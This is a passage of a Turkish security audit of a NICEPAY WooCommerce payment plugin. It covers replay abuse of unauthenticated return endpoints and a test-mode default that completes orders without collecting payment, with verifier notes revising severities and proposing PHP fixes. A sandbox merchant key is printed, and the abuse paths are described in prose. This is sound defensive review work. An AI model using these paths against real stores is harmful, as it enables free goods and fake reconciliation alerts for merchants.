(1) "Kurban" çerçevesi yanlış. Moid `bin2hex(random_bytes(8))` (api:92) ile üretiliyor ve yalnızca sipariş sahibine görünüyor; başka bir müşterinin bekleyen Moid'i 64-bit tahmin gerektiriyor. Senaryonun kendisi de saldırganın kendi B siparişini kullanıyor. Yani pratikte bu, üçüncü şahsa yönelik bir ele geçirme değil; saldırganın kendi siparişlerini bozarak tüccarın operasyonel sinyalini (needs_reconciliation kuyruğu, on-hold siparişler) ve NICEPAY'e giden approval/net-cancel trafiğini kirletmesidir. Para kaybı veya bedava mal yolu YOK: approval cevabı Moid/TID/tutar/yöntem üzerinden ayrıca bağlanıyor (inbound-validator:152-180), uyuşmazlıkta net-cancel + red uygulanıyor.
(2) İddiada geçmeyen kısmi bir engel var: `UNIQUE KEY uniq_tid (tid)` (schema:127). Aynı TxTid ikinci bir satıra yazılamadığı için tekrarlanan replay'ler `nicepay_update_transaction(... 'tid' => $tx_tid ...)` (gateway:461) adımında düşer. Ancak bu güvenlik kontrolü olarak tasarlanmamış ve saldırıyı durdurmuyor: düşen istek `nicepay_abort_authenticated_payment` yoluna girip bayat token'la net-cancel deneyor, bu da WP_Error dönüp yine `needs_reconciliation` + `on-hold` üretiyor (functions:236-262, gateway:470-478). Yani sonuç aynı, sadece yol farklı.
(3) İddiada geçmeyen ağırlaştırıcı: dönüş uçlarında hiç hız sınırı yok — `nicepay_check_public_rate_limit` yalnızca `standalone_init` ve `standalone_nonce` için çağrılıyor (nicepay-payment-gateway.php:556, 641). Kimliksiz tek bir POST, sunucudan NICEPAY'e giden bir approval + bir net-cancel isteği tetikliyor.

Sonuç: bulgu bir replay/binding eksikliğidir ve düzeltilmelidir; ancak istismarın somut sonucu fon/sipariş ele geçirme değil, saldırganın kendi siparişleri üzerinden sınırsız sahte mutabakat alarmı + on-hold gürültüsü + dışa giden istek amplifikasyonudur.
- Gerekçe: İddia edilen tüm kod gerçekleri doğrulandı (satır numaraları dahil). Ancak "sonuç ve istismar edilebilirlik" merceğinden iki abartı ve bir eksik var. Abartı 1: etki metni "kurban denemesi on-hold'a düşer, müşteri tekrar ödeyemez" diyor; oysa hedeflenebilir tek işlem saldırganın kendi Moid'ini bildiği kendi siparişidir — Moid 8 rastgele bayt içerir (api:92, `bin2hex(random_bytes(8))`) ve yalnızca sipariş sahibine gösterilir, dolayısıyla üçüncü şahıs siparişini hedefleme yolu kanıtlanmamıştır. Abartı 2: severity 'high'. Parasal sonuç yok — approval cevabı Moid/TID/tutar/yöntem/imza ile bağlanıyor ve uyuşmazlıkta net-cancel edilip reddediliyor; ayrıca `! $order->needs_payment()` ve `wc_order_key_hash` kapıları (gateway:485-492) sipariş ikamesini de sınırlıyor. Kalan gerçek zarar operasyoneldir: kimliksiz, hız sınırsız bir POST ile sınırsız sahte 'manual reconciliation' alarmı, on-hold sipariş üretimi ve dışa giden approval/net-cancel amplifikasyonu; tek maliyet bir kez gerçek kart doğrulaması yapmaktır (yakalanan gövde farklı Moid'lere tekrar tekrar yapıştırılabiliyor). Bu 'medium'dur. Eksik: iddia `uniq_tid` benzersiz indeksini (schema:127) hiç anmıyor; bu, aynı TxTid'in ikinci bir satıra bağlanmasını fiilen engelliyor — yani önerideki (a) maddesi kısmen zaten var, ama fail-open değil fail-noisy davrandığı için saldırıyı durdurmuyor, sadece hangi kod yolundan on-hold'a düşüldüğünü değiştiriyor. Önerinin (a)/(c) maddeleri bu nedenle 'yan etkisiz reddet' olarak yeniden yazılmalı: TxTid ledger'da varsa net-cancel bile denenmeden 4xx ile sessizce reddedilmeli, aksi halde düzeltme yine alarm üretir.

---

### SEC-013 — NICEPAY'in herkese açık sandbox MID ve MerchantKey'i aktivasyonda otomatik kuruluyor; is_available() test modunu hiç engellemiyor

| | |
|---|---|
| **Severity** | 🟠 Yüksek |
| **Kategori** | insecure-defaults |
| **Konum** | [nicepay-payment-gateway.php:34](../../../nicepay-payment-gateway.php#L34) |
| **Güven** | high |
| **Doğrulama** | ⚠️ 2 kısmen |

**Sorun ve kanıt**

```php
Sandbox kimlik bilgileri kaynak kodda sabit: `define( 'NICEPAY_TEST_MID', 'nicepay00m' );` ve `define( 'NICEPAY_TEST_MERCHANT_KEY', 'EYzu8jGGMfqaDEp76gSckuvnaHHu+bC4opsSN6lHv3b2lurNYkVXrZ7Z1AoqQnXI3eLuaUFyoRNC6FkrzVjceg==' );` (satır 33-34) ve set_default_options() bunları aktivasyonda option'lara yazıyor: `add_option( 'nicepay_mode', 'test' ); add_option( 'nicepay_test_mid', NICEPAY_TEST_MID ); add_option( 'nicepay_test_merchant_key', NICEPAY_TEST_MERCHANT_KEY );` (satır 272-274). WC_Gateway_NicePay::is_available() yedi kontrol yapıyor ama hiçbiri modu sorgulamıyor — yalnızca `if ( ! $this->api->get_mid() || ! $this->api->get_merchant_key() ) return false;` (class-nicepay-gateway.php:85-87) var, ki bu test modunda her zaman doludur. Başarılı bir sandbox onayı ise doğrudan `$order->payment_complete( $tid );` çağırıyor (class-nicepay-gateway.php:639). Tek koruma, yalnızca manage_options kullanıcılarına gösterilen kapatılabilir bir admin uyarısı (nicepay-functions.php:507-513). readme.txt:57 ise 'Credentials and supported methods must be deliberately configured and enabled' diyerek koda aykırı bir güvence veriyor.
```

**Başarısızlık senaryosu**

Bir merchant eklentiyi kurar, WooCommerce > Payments altında NicePay'i etkinleştirir, ancak NicePay > Settings > API Credentials sekmesinde canlı MID/anahtarı girip modu 'live' yapmayı unutur veya sonraya bırakır. is_available() true döner, checkout'ta NicePay görünür. Herhangi bir ziyaretçi sipariş verir, NICEPAY sandbox penceresinde test kartıyla onay alır, ResultCode 3001 döner, is_success_code true olur ve sipariş 'processing' durumuna geçer. Merchant siparişi sevk eder; hiçbir para hiçbir zaman tahsil edilmemiştir. Aynı kişi bunu sınırsız tekrarlayabilir.

**Etki**

Test modunda kalmış bir mağazada gerçek müşteri siparişleri hiç para tahsil edilmeden otomatik olarak payment_complete() ediliyor ve stok düşülüyor — yani bedava ürün. MerchantKey herkese açık olduğu için o modda 'imza doğrulaması' merchant'a özgü hiçbir güvence sağlamıyor; imza üretmek isteyen herkes anahtara sahip. Bu, WordPress.org'a yayınlanacak bir eklentide anahtarın milyonlarca kopyada dağıtılması anlamına da geliyor. Ayrıca ödeme yöntemi listeleyen bir mağaza taramasıyla test modu dışarıdan tespit edilebilir (ödeme formundaki 'Test mode' uyarısı, templates/payment-form.php:17-21).

**Öneri**

(1) set_default_options() içinde nicepay_test_mid/nicepay_test_merchant_key'i BOŞ bırak; API sekmesine 'NICEPAY genel sandbox kimliklerini yükle' butonu ekle (açık kullanıcı eylemi). (2) is_available() ve render_payment_shortcode()'a mod kapısı ekle: test modunda yalnızca `'yes' === get_option( 'nicepay_test_mode_acknowledged' )` ise ödeme aç; bu option ayrı bir onay kutusuyla ve uyarı metniyle alınsın. (3) Test modunda payment_complete() yerine siparişi `on-hold` + açıklayıcı nota al, böylece sandbox sertifikasyonu yapılabilirken otomatik sevkiyat imkânsız olsun. (4) Test modu aktifken admin uyarısını kapatılamaz (is-dismissible olmayan) yap ve WooCommerce > Status ekranına da yaz. (5) readme.txt:57'deki iddiayı gerçek davranışla hizala.

**Doğrulayıcı notu** (lens: `kod-gercekligi`, karar: `partially-confirmed`)

- Düzeltilmiş iddia: Test modu ödeme yaşam döngüsünün hiçbir noktasında kapı görevi görmüyor: NICEPAY'in genel sandbox MID/MerchantKey'i aktivasyonda option'lara yazılıyor (nicepay-payment-gateway.php:272-274), CARD varsayılan açık (nicepay-functions.php:1342), is_available() altı kontrolünün hiçbiri modu sorgulamıyor (class-nicepay-gateway.php:76-104) ve sandbox onayı doğrudan $order->payment_complete() çağırıyor (satır 639). Bu nedenle gateway'i etkinleştirip modu 'live' yapmayı unutan bir mağazada gerçek siparişler para tahsil edilmeden 'processing' olur ve stok düşer. Düzeltmeler: (a) uyarı ZATEN kapatılamaz durumda (satır 265'te 'is-dismissible' yok), dolayısıyla "tek koruma kapatılabilir bir uyarı" ifadesi yanlış; ek olarak gateway varsayılanı 'no' (satır 29), is_ssl() zorunlu (satır 98) ve müşteriye "Test mode" bandı gösteriliyor (templates/payment-form.php:17-21). (b) is_available() altı kontrol yapıyor, yedi değil. (c) readme.txt:57'nin ilk cümlesi ("disabled by default") kodla UYUMLU; yalnızca "Credentials ... must be deliberately configured" ifadesi test kimlikleri ön-dolu olduğu için yanıltıcı. (d) MerchantKey NICEPAY'in kendi dokümantasyonundaki genel sandbox anahtarıdır; "sır sızıntısı" değil, asıl risk test modunun sipariş tamamlamasıdır.
- Gerekçe: Çekirdek iddia doğru ve kodla kanıtlanıyor: (a) sandbox MID/MerchantKey kaynakta sabit, (b) aktivasyonda mod 'test' + bu kimlikler option'lara yazılıyor, (c) CARD varsayılan olarak açık, (d) is_available() modu hiç sorgulamıyor, (e) sandbox başarı kodunda doğrudan $order->payment_complete( $tid ) çağrılıyor. Yani merchant WooCommerce > Payments'ta NicePay'i açıp modu 'live' yapmayı unutursa, gerçek siparişler hiç para tahsil edilmeden 'processing'e geçer. Konum referanslarının tümü (33, 34, 271-274, gateway 76/85-87, 639, functions 507-513, payment-form 17-21) dosyaların şu anki haliyle birebir eşleşiyor.

Ancak üç detay yanlış/abartılı:
1. "Tek koruma, kapatılabilir bir admin uyarısı" — uyarı KAPATILABİLİR DEĞİL. nicepay-payment-gateway.php:265 `echo '<div class="notice ' . esc_attr( $class ) . '">` — 'is-dismissible' sınıfı yok, dolayısıyla öneri (4)'ün ilk yarısı zaten uygulanmış durumda. Ayrıca tek koruma da değil: gateway varsayılanı `$this->enabled = $this->get_option( 'enabled', 'no' )` (class-nicepay-gateway.php:29), is_ssl() zorunluluğu (satır 98-100) ve müşteriye görünen "Test mode — no real payment will be collected." bandı (templates/payment-form.php:17-21) da senaryoyu daraltıyor. Yani bu "sessiz" bir açık değil; merchant'ın iki ayrı açık uyarıyı görmezden gelmesini gerektiriyor.
2. "is_available() yedi kontrol yapıyor" — ALTI kontrol var (enabled, installer, mid/key, enabled_methods, currency, ssl; satır 77-104).
3. readme.txt:57'nin "koda aykırı güvence" verdiği iddiası kısmen yanlış. Sorunun cevabı olan "No. The WooCommerce gateway and standalone payment forms are disabled by default." kod gerçeğiyle uyumlu (gateway enabled varsayılanı 'no', nicepay_standalone_enabled 'no'). Yalnızca ikinci cümledeki "Credentials ... must be deliberately configured" ifadesi test kimlikleri ön-dolu olduğu için gevşek/yanıltıcı.

MerchantKey'in "milyonlarca kopyada dağıtılması" kısmı da riski şişiriyor: bu, NICEPAY'in kendi dokümantasyonunda yayımladığı genel sandbox anahtarıdır; gizli bir sır sızmıyor. Gerçek risk sır sızıntısı değil, test modunun sipariş tamamlamasıdır. Bu nedenle severity high olarak korunuyor (bedava sevkiyat sonucu doğrudan finansal), fakat gerekçe "hardcoded secret" değil "test modunun ödeme lifecycle'ını kapatmaması" olmalı.

**Doğrulayıcı notu** (lens: `sonuc-ve-istismar`, karar: `partially-confirmed`)

- Severity düzeltmesi: `high` → `medium`
- Düzeltilmiş iddia: Eklenti NICEPAY'in kamuya açık sandbox MID/MerchantKey'ini (nicepay-payment-gateway.php:33-34) aktivasyonda doğrudan option'lara yazıyor ve modu 'test' olarak ayarlıyor (satır 272-274). WC_Gateway_NicePay::is_available() (class-nicepay-gateway.php:76-103) altı koşul kontrol ediyor ama hiçbiri modu sorgulamıyor; test modunda kimlik bilgileri her zaman dolu olduğu için satır 85'teki kimlik kontrolü hiçbir zaman engellemiyor. Başarılı bir sandbox onayı canlı bir onayla aynı yolu izliyor ve $order->payment_complete( $tid ) çağırıyor (satır 639) — yani test modunda kalmış bir mağazada gerçek siparişler para tahsil edilmeden 'processing' oluyor ve stok düşüyor.

Bu bir uzaktan istismar edilebilir açık DEĞİL, güvensiz varsayılan (footgun): tetiklenmesi için merchant'ın (a) gateway'i bilinçli açması (varsayılan 'no', satır 29/45), (b) modu 'test'te bırakması ve (c) hem kalıcı admin uyarısını hem ayarlardaki TEST rozetini hem de kendi checkout sayfasındaki "Test mode — no real payment will be collected." bandını (payment-form.php:17-21) görmezden gelip siparişi sevk etmesi gerekir. Standalone yüzey ayrıca varsayılan kapalıdır (satır 277, 394-397). Admin uyarısı iddia edilenin aksine kapatılabilir DEĞİLDİR (satır 265'te is-dismissible yok). Sandbox anahtarı da bir sızıntı değil, NICEPAY'in kendi dokümanlarındaki örnek anahtardır; asıl kusur anahtarın gizliliği değil, aktif yapılandırma olarak önceden yüklenmiş olmasıdır. readme.txt:57 çelişkisi kısmidir — cümlenin ilk iki iddiası kodla uyumludur, yalnızca kimlik bilgilerinin "deliberately configured" olduğu iddiası test modu için yanlıştır.

Geçerli kalan düzeltmeler: (1) test kimliklerini aktivasyonda seed etme, API sekmesine açık bir "sandbox kimliklerini yükle" butonu koy; (2) test modunda payment_complete() yerine siparişi on-hold + açıklayıcı nota al (en yüksek değerli düzeltme); (3) readme.txt:57'yi gerçek davranışla hizala. Öneri (4)'ün "kapatılamaz uyarı" kısmı zaten uygulanmıştır; geriye yalnızca WooCommerce > Status ekranına yazma kalır.
- Gerekçe: ÇEKİRDEK OLGULAR DOĞRU — hepsini kodda gördüm: sandbox MID/key kaynak kodda sabit, aktivasyonda option'lara yazılıyor, mod varsayılanı 'test', is_available() modu hiç sorgulamıyor ve test modunda başarılı onay doğrudan payment_complete() çağırıyor. Bu kısımlarda iddia birebir doğru.

ANCAK üç noktada iddia yanlış veya abartılı:

(1) OLGU HATASI — "Tek koruma, kapatılabilir bir admin uyarısı". Uyarı KAPATILABİLİR DEĞİL. nicepay-payment-gateway.php:265 sadece `notice notice-warning` / `notice notice-error` basıyor; `is-dismissible` sınıfı yok. Yani önerinin (4) maddesinin yarısı zaten uygulanmış. Ayrıca "tek koruma" değil: (a) ayarlar başlığında TEST rozeti (admin/class-nicepay-admin.php:357-359), (b) readiness paneli (admin:425-437), (c) API sekmesinde mod bildirimi (admin:638-646), (d) MÜŞTERİYE görünen checkout uyarısı "Test mode — no real payment will be collected." (templates/payment-form.php:17-21) ve standalone formda aynısı (templates/standalone-payment-form.php:90). İddia bunlardan yalnızca birini (checkout uyarısını) ve o da "tespit vektörü" olarak zikrediyor, mitigasyon olarak saymıyor.

(2) SAYIM HATASI — is_available() "yedi kontrol" değil, altı koşul bloğu içeriyor (satır 77, 81, 85, 89, 93, 98). Önemsiz ama satır referansı iddiası titizlik gerektiriyor.

(3) İSTİSMAR EDİLEBİLİRLİK ABARTILI — LENS gereği somut adımlara baktım. Saldırganın tetikleyebileceği hiçbir yol yok; senaryonun TAMAMI merchant'ın yapılandırma hatasına bağlı ve şu önkoşulları gerektiriyor: (a) merchant WooCommerce > Payments'ta gateway'i BİLİNÇLİ olarak açmalı (varsayılan 'no', class-nicepay-gateway.php:45 ve satır 29), (b) modu 'test'te bırakmalı, (c) site HTTPS olmalı (satır 98), (d) para birimi KRW olmalı, (e) merchant hem kalıcı admin uyarısını, hem TEST rozetini, hem de kendi checkout sayfasındaki "Test mode — no real payment will be collected." bandını görmezden gelmeli, (f) sonra da siparişi sevk etmeli. Yetkisiz bir saldırgan canlı bir mağazayı test moduna alamaz; sadece zaten yanlış yapılandırılmış bir mağazadan faydalanabilir. Bu bir auth bypass veya uzaktan istismar değil, klasik bir "insecure default / footgun". Standalone yüzey ise ayrıca `nicepay_standalone_enabled='no'` ile kapalı (satır 277 + shortcode kapısı satır 395), yani ikinci yüzey senaryoya hiç dahil olmuyor.

Ayrıca "anahtarın milyonlarca kopyada dağıtılması" çerçevesi yanıltıcı: nicepay00m ve o merchant key NICEPAY'in kendi kamuya açık entegrasyon dokümanlarında ve tüm resmi örnek SDK'larında yayınlanan sample kimlik bilgileridir — bu bir sır sızıntısı değil. Gerçek sorun anahtarın gizliliği değil, AKTİF yapılandırma olarak önceden yüklenmiş olmasıdır (öneri 1 bu yüzden hâlâ geçerli).

readme.txt:57 çelişkisi de yalnızca KISMEN doğru: cümlenin ilk iki iddiası ("The WooCommerce gateway and standalone payment forms are disabled by default") kodla TAM uyumlu ve zorlanıyor. Yalnızca üçüncü cümle ("Credentials ... must be deliberately configured") test modu kimlik bilgileri için yanlış.

Sonuç: bulgu meşru ve düzeltilmeli (özellikle öneri 1, 2 ve 3), ama 'high' değil 'medium'. Yayınlanmış bir eklentide veri kaybı/para kaybı potansiyeli var ancak istismar saldırgan kontrolünde değil ve birden fazla görünür uyarı katmanı mevcut. Öneri 3 (test modunda on-hold) bu bulgunun en değerli kısmı; öneri 4'ün yarısı zaten uygulanmış durumda.

---

### SEC-001 — Test modu herkese açık NICEPAY sandbox kimlik bilgileriyle varsayılan olarak aktif ve sipariş yaşam döngüsü canlı ödemeden ayırt edilemiyor

| | |
|---|---|
| **Severity** | 🟡 Orta *(doğrulama sonrası; ilk değer 🟠 Yüksek)* |
| **Kategori** | insecure-default / business-logic |
| **Konum** | [nicepay-payment-gateway.php:272](../../../nicepay-payment-gateway.php#L272) |
| **Güven** | high |
| **Doğrulama** | ⚠️ 2 kısmen |

**Sorun ve kanıt**

````php
`set_default_options()` kurulumda şunları yazıyor:
```php
add_option( 'nicepay_mode', 'test' );                                  // :272
add_option( 'nicepay_test_mid', NICEPAY_TEST_MID );                    // :273 -> 'nicepay00m'
add_option( 'nicepay_test_merchant_key', NICEPAY_TEST_MERCHANT_KEY );  // :274 -> 'EYzu8jGG...'
```
Bu MID/anahtar çifti NICEPAY'in yayımlanmış, herkese açık sandbox kimlik bilgisidir (dosyanın 33-34. satırlarında sabit olarak gömülü). `WC_Gateway_NicePay::is_available()` (gateway:76-103) mode kontrolü yapmıyor — yalnızca enabled + şema + MID/key dolu + yöntem + KRW + HTTPS bakıyor; `'test' === $mode` durumu kapıyı kapatmıyor. Başarılı bir sandbox onayında (`ResultCode 3001`) kod tam canlı yolu izliyor:
```php
$order->payment_complete( $tid );                                      // gateway:639
$order->add_order_note( sprintf( __( 'NicePay payment completed. Method: %1$s, TID: %2$s', ... ) ) ); // :640-645
```
Sipariş notunda, sipariş meta'sında (`_nicepay_tid`, `_nicepay_pay_method`, `_nicepay_auth_code`) veya sipariş durumunda test modu izine dair hiçbir şey yok. Tek uyarı `nicepay_get_configuration_warnings()` (functions:507-513) ve bunu render eden `configuration_notice()` yalnızca `current_user_can('manage_options')` için çalışıyor (main:258) — shop_manager rolü bu uyarıyı hiç görmez.
````

**Başarısızlık senaryosu**

Merchant eklentiyi kurar (mode=test, test_mid=nicepay00m otomatik yazılır), MID/key alanlarına dokunmadan WooCommerce > Ödemeler altında NicePay'i etkinleştirir (readme.txt:49 adımı bunu ayrı bir adım olarak öneriyor). Bir ziyaretçi 500.000 KRW'lik indirilebilir bir ürünü sepete atar, NicePay'i seçer, sandbox penceresinde NICEPAY'in yayımlanmış test kartını girer. `AuthResultCode=0000` döner, imza doğrulanır (anahtar zaten public), `request_approval()` `ResultCode=3001` döndürür, `payment_complete()` çağrılır, sipariş `completed` olur ve indirme linki e-postalanır. Merchant'ın banka hesabına 0 KRW geçer; WooCommerce sipariş ekranında sipariş normal ödenmiş bir siparişten ayırt edilemez.

**Etki**

Kimlik doğrulaması olmayan bir saldırgan (veya sıradan bir müşteri), test modunda kalmış bir mağazada NICEPAY sandbox test kartıyla ödeme akışını tamamlayarak siparişi `processing`/`completed` durumuna getirebilir; sanal/indirilebilir ürünlerde teslimat otomatik gerçekleşir. Hiç para tahsil edilmez. Sipariş ekranında bunu ayırt edecek bir işaret olmadığı için tespit gecikir. Bu, ödeme eklentilerinde en sık görülen gerçek para kaybı senaryosudur ve kurulum varsayılanı tam olarak bu duruma işaret ediyor.

**Öneri**

Üç katmanlı bir kapı ekleyin:
1. `is_available()` içinde canlı yüzeyde test modunu bloklayın veya en azından açık bir onay isteyin (retention ayarındaki `acknowledged` deseninin aynısı):
```php
if ( 'test' === $this->api->get_mode() &&
     'yes' !== get_option( 'nicepay_test_mode_acknowledged', 'no' ) ) {
    return false;
}
```
2. Sandbox kimlik bilgilerini varsayılan option olarak yazmayı bırakın; `NICEPAY_TEST_*` sabitlerini yalnız geliştirici dokümanında bırakıp alanları boş bırakın — böylece `is_available()`'ın mevcut `! $this->api->get_mid()` kontrolü doğal bir fail-closed kapısı olur.
3. Test modunda tamamlanan her siparişe kalıcı iz bırakın:
```php
$order->update_meta_data( '_nicepay_mode', $this->api->get_mode() );
if ( $this->api->is_test_mode() ) {
    $order->add_order_note( __( 'WARNING: this NicePay payment was approved in TEST mode. No funds were collected. Do not fulfil.', 'nicepay-payment-gateway' ) );
    $order->update_status( 'on-hold' ); // veya en azından otomatik completed'a geçmeyi engelleyin
}
```
Ayrıca `configuration_notice()`'ın capability'sini `nicepay_current_user_can_manage_payments()` yapın ki shop_manager de uyarıyı görsün.

**Doğrulayıcı notu** (lens: `kod-gercekligi`, karar: `partially-confirmed`)

- Düzeltilmiş iddia: Kurulum varsayılanı test modunu ve repoda açıkça gömülü NICEPAY sandbox MID/anahtarını option'lara yazıyor (nicepay-payment-gateway.php:272-274, sabitler :33-34) ve `WC_Gateway_NicePay::is_available()` (includes/class-nicepay-gateway.php:76-103) mod kontrolü yapmıyor. Merchant gateway'i test modundayken etkinleştirirse (WooCommerce gateway varsayılanı `'no'` olduğu için bu bilinçli bir adımdır, readme.txt:49), sandbox onayı canlı yolun aynısını izler: `payment_complete()` çağrılır (satır 639) ve WooCommerce sipariş nesnesine test moduna dair HİÇBİR iz yazılmaz — ne `_nicepay_mode` meta'sı, ne sipariş notunda bir uyarı, ne farklı bir sipariş durumu. Dolayısıyla sipariş listesi/detay ekranında ve otomatik teslimatta (indirilebilir ürün) test siparişi ödenmiş siparişten ayırt edilemez; 0 KRW tahsil edilir.

Düzeltmeler: (a) Eklenti tamamen sessiz DEĞİL — ödeme sayfasında müşteriye görünen bir test bandı vardır (templates/payment-form.php:17-21, `$is_test_mode` class-nicepay-gateway.php:250'de set edilir) ve eklentinin kendi işlem defteri `mode` kaydeder (gateway:285), onayda `hash_equals` ile doğrular (gateway:719) ve admin işlem detayında "Environment: Test" olarak gösterir (admin/class-nicepay-transactions.php:381-391, liste kolonu :144). (b) "Kimlik doğrulaması olmayan saldırgan tek başına tetikleyebilir" doğru değil; önce merchant'ın test modunda gateway'i açmış olması gerekir (`'enabled'` varsayılanı `'no'`, gateway:29/45). Asıl kusur bu yüzden "insecure default" değil, "yanlış yapılandırmayı WooCommerce sipariş katmanına taşıyan fail-open tasarım ve eksik kalıcı iz"dir. Öneri geçerliliğini korur: `is_available()`'da açık onay (`acknowledged`) kapısı, sandbox kimlik bilgilerini varsayılan option olarak yazmayı bırakmak, `_nicepay_mode` order meta'sı + test onaylarında uyarı notu / `on-hold`, ve `configuration_notice()` capability'sini mevcut `nicepay_current_user_can_manage_payments()` (functions:484) ile değiştirmek.
- Gerekçe: Çekirdek iddia doğrulandı: kurulum varsayılanı gerçekten test modu + repoda açıkça gömülü sandbox MID/anahtar; `is_available()` mod kontrolü yapmıyor; başarılı sandbox onayı canlı yolun aynısını izleyip `payment_complete()` çağırıyor; WooCommerce sipariş nesnesinde (meta/not/durum) test izi bırakılmıyor; `configuration_notice()` gerçekten `manage_options` ile sınırlı. Tüm satır numaraları dosyanın şu anki haliyle bire bir eşleşiyor.

Ancak iddianın iki somut ifadesi KODLA ÇELİŞİYOR ve etki tahminini şişiriyor:

1. "Tek uyarı `nicepay_get_configuration_warnings()`" YANLIŞ. `templates/payment-form.php:17-21` ödeme sayfasında müşteriye görünür bir test-modu bandı basıyor ("Test mode — no real payment will be collected."), ve `$is_test_mode` `class-nicepay-gateway.php:250`'de set edilip aynı metottaki `include` (satır 370) ile şablona geçiyor. Yani "sipariş normal ödenmiş bir siparişten ayırt edilemez" senaryosunun önündeki ilk perde mevcut.

2. "Sipariş yaşam döngüsünde test modu izine dair hiçbir şey yok" KISMEN YANLIŞ. Eklentinin kendi işlem defterine `mode` kolonu yazılıyor (`class-nicepay-gateway.php:285`), onay yolunda `hash_equals` ile doğrulanıyor (satır 719) ve admin işlem detayında "Environment: Test" alanı olarak gösteriliyor (`admin/class-nicepay-transactions.php:381-391`), liste kolonlarında da `mode` var (satır 144). İz WooCommerce sipariş ekranında yok — bu doğru — ama eklenti içinde kalıcı ve görünür.

Ayrıca sömürü zinciri kimlik doğrulaması olmayan saldırgan için "tek tık" değil: `woocommerce_nicepay_settings['enabled']` varsayılanı `'no'` (`class-nicepay-gateway.php:29,45`) ve `nicepay_standalone_enabled` varsayılanı `'no'` (main:278). Yani merchant'ın test modundayken kapıyı bilinçli açması gerekiyor — readme step 7 (readme.txt:49) bunu ayrı adım olarak öneriyor, step 6 (readme.txt:48) ise canlıya geçmeden sandbox testi yapılmasını söylüyor, dolayısıyla senaryo gerçekçi ama "insecure default" değil "unsafe-but-warned configuration". `nicepay_current_user_can_manage_payments()` (functions:484-486) zaten var, yani önerinin capability kısmı doğrudan uygulanabilir.

Sonuç: kök neden ve öneri geçerli; "hiçbir iz/uyarı yok" ve "kimlik doğrulaması olmayan saldırgan" çerçevesi abartılı olduğu için severity high -> medium.

**Doğrulayıcı notu** (lens: `sonuc-ve-istismar`, karar: `partially-confirmed`)

- Düzeltilmiş iddia: Test modu kurulumda varsayılan olarak aktif ve public NICEPAY sandbox kimlik bilgileri hem option olarak yazılıyor (nicepay-payment-gateway.php:272-274) hem de API katmanında fallback sabit olarak gömülü (includes/class-nicepay-api.php:29-32), bu yüzden option'lar silinse bile fail-closed olmuyor. `WC_Gateway_NicePay::is_available()` (includes/class-nicepay-gateway.php:76-103) mode kontrolü yapmadığı için, merchant ağ geçidini test modunda açık bıraktığında sandbox onayı (`ResultCode 3001`) tam canlı yolu izleyip `payment_complete()` çağırıyor (gateway:639) ve sanal ürünler otomatik teslim ediliyor. Test modu izi ledger'da (gateway:285) ve eklentinin İşlemler ekranında (admin/class-nicepay-transactions.php:381-392) tutuluyor, müşteriye de checkout'ta banner gösteriliyor (templates/payment-form.php:17-21) — ancak WooCommerce sipariş ekranında (meta/not/durum) hiçbir iz yok, dolayısıyla sipariş normal ödenmiş bir siparişten ayırt edilemiyor. Ayrıca `configuration_notice()` (nicepay-payment-gateway.php:258) `manage_options` istediği için shop_manager rolü uyarıyı hiç görmüyor; oysa kod tabanında zaten `nicepay_current_user_can_manage_payments()` (includes/nicepay-functions.php:484-486) mevcut. Bu bir zafiyet değil, merchant yanlış yapılandırmasına karşı eksik güvenlik ağıdır: ağ geçidi ve standalone form varsayılan kapalıdır (gateway:29,45; main:276) ve readme.txt:44-58 test-önce akışını belgeler.
- Gerekçe: Çekirdek teknik iddia doğrulandı: kurulum varsayılanı test modu + gömülü public sandbox kimlik bilgileri, `is_available()` mode kontrolü yapmıyor, başarılı sandbox onayı canlı yolla birebir aynı `payment_complete()` akışını izliyor ve WooCommerce sipariş nesnesine (meta/not/durum) hiçbir test-modu izi düşmüyor. Satır referansları dosyanın şu anki haliyle eşleşiyor.

Ancak iddia üç noktada abartılı/yanlış:

1. "Hiçbir iz yok" YANLIŞ. Test modu için birden fazla görünür sinyal var:
   - Müşteriye gösterilen ödeme formunda açık banner: `templates/payment-form.php:17-21` ("Test mode — no real payment will be collected.") ve Blocks tarafında `includes/class-nicepay-blocks-integration.php:71-72`.
   - Ledger her işlemde ortamı kalıcı saklıyor: `includes/class-nicepay-gateway.php:285` (`'mode' => $this->api->get_mode()`), şema `includes/class-nicepay-transaction-schema.php:60`, ve admin işlem detayında "Environment: Test" alanı `admin/class-nicepay-transactions.php:381-392`.
   - Ayarlar sayfasında sürekli mod uyarısı: `admin/class-nicepay-admin.php:638-640`.
   Doğru olan daralt���lmış iddia: iz WooCommerce *sipariş ekranında* yok; operatör ayrı bir eklenti ekranına bakmak zorunda.

2. "Kimlik doğrulaması olmayan bir saldırgan ... ödeme akışını tamamlayabilir" çerçevesi bir güvenlik açığı gibi sunuluyor; gerçekte zincir merchant'ın kasıtlı yanlış yapılandırmasını gerektiriyor. WooCommerce ağ geçidi varsayılan KAPALI (`includes/class-nicepay-gateway.php:29,45` — `'default' => 'no'`), standalone `nicepay_standalone_enabled` varsayılan `'no'` (`nicepay-payment-gateway.php:276`), ayrıca HTTPS + KRW + yöntem koşulları var (`gateway:76-103`). readme.txt:44-51 ve FAQ ("Does activating the plugin immediately accept payments? No.") bunu açıkça belgeliyor. Yani bu bir "insecure default + eksik güvenlik ağı", sömürülebilir bir zafiyet değil. Ön koşul: merchant, üç ayrı test-modu uyarısını (admin_notices, ayarlar sayfası, checkout banner'ı) görmezden gelip ağ geçidini elle açacak.

3. Önerinin 2. maddesi ("varsayılan option yazmayı bırakın, `is_available()` doğal fail-closed olur") koda göre ÇALIŞMAZ: `includes/class-nicepay-api.php:29-32` option okumasında fallback olarak sabitleri kullanıyor — `get_option('nicepay_test_mid', NICEPAY_TEST_MID)`. Option silinse bile `get_mid()` yine `nicepay00m` döner ve kapı açık kalır. Düzeltme API katmanında da yapılmalı.

Doğrulanan asıl eksiklikler (bunlar geçerli): (a) `is_available()` içinde mode kapısı/onay yok; (b) siparişe `_nicepay_mode` meta'sı veya test uyarı notu yazılmıyor, `payment_complete()` sanal ürünü otomatik `completed` yapıyor; (c) `configuration_notice()` (`nicepay-payment-gateway.php:257-259`) `manage_options` istiyor, oysa aynı dosyada zaten `nicepay_current_user_can_manage_payments()` (`includes/nicepay-functions.php:484-486`) mevcut — shop_manager uyarıyı görmez. Bu tutarsızlık gerçek ve kolay düzeltilebilir.

Sonuç etkisi gerçek para kaybı değil, "yanlış yapılandırmada sessiz teslimat" riski; birden çok görsel uyarı ve ledger izi mevcut olduğu için severity high değil medium.

---

